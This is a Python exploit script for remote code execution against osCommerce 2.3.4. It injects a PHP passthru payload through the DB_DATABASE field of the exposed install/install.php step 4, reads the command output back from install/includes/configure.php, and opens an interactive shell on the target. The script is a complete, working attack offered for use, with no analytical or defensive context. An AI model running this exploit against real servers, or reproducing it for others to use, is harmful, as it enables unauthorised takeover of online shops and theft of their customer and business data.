import requests
import sys
import urllib3

# Suppress only the single InsecureRequestWarning from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_usage():
    """Prints the usage instructions for the script."""
    print("Usage: python3 osCommerce2_3_4_RCE.py <url>")
    print("Example: python3 osCommerce2_3_4_RCE.py http://localhost/oscommerce-2.3.4/catalog")
    sys.exit(0)

# Check if the correct number of arguments is provided
if len(sys.argv) != 2:
    print("Error: Please specify the osCommerce URL")
    print_usage()

base_url = sys.argv[1].rstrip('/')
test_vuln_url = f"{base_url}/install/install.php"

def rce(command):
    """Executes the remote command on the vulnerable osCommerce server."""
    target_url = f"{base_url}/install/install.php?step=4"
    payload = f"'); passthru('{command}'); /*"

    # Data to be sent in the POST request
    data = {
        'DIR_FS_DOCUMENT_ROOT': './',
        'DB_DATABASE': payload
    }

    # Sending the payload to the target URL
    response = requests.post(target_url, data=data, verify=False)

    if response.status_code == 200:
        read_cmd_url = f"{base_url}/install/includes/configure.php"
        cmd_response = requests.get(read_cmd_url, verify=False)

        if cmd_response.status_code == 200:
            command_output = cmd_response.text.split('\n')
            output_lines = command_output[2:]
            if output_lines:
                for line in output_lines:
                    print(line)
            else:
                return '[!] Error: No output returned. The command may be invalid or produced no output.'
        else:
            return '[!] Error: configure.php not found'
    else:
        return '[!] Error: Failed to inject payload'

# Testing if the install directory is accessible, which indicates a potential vulnerability
test_response = requests.get(test_vuln_url, verify=False)

if test_response.status_code == 200:
    print('[*] Install directory is accessible, the host is likely vulnerable.')

    print('[*] Testing system command injection...')
    initial_cmd = 'whoami'

    print(':User  ', end='')
    error_message = rce(initial_cmd)

    if error_message:
        print(error_message)
        sys.exit(0)

    # Interactive shell for executing further commands
    while True:
        try:
            cmd = input('$ ')
            if cmd.lower() in ('exit', 'quit'):
                print('[*] Exiting...')
                break
            error_message = rce(cmd)
            if error_message:
                print(error_message)
                sys.exit(0)
        except KeyboardInterrupt:
            print('\n[*] Exiting...')
            break
else:
    print('[!] Install directory not found, the host is not vulnerable.')
    sys.exit(0)

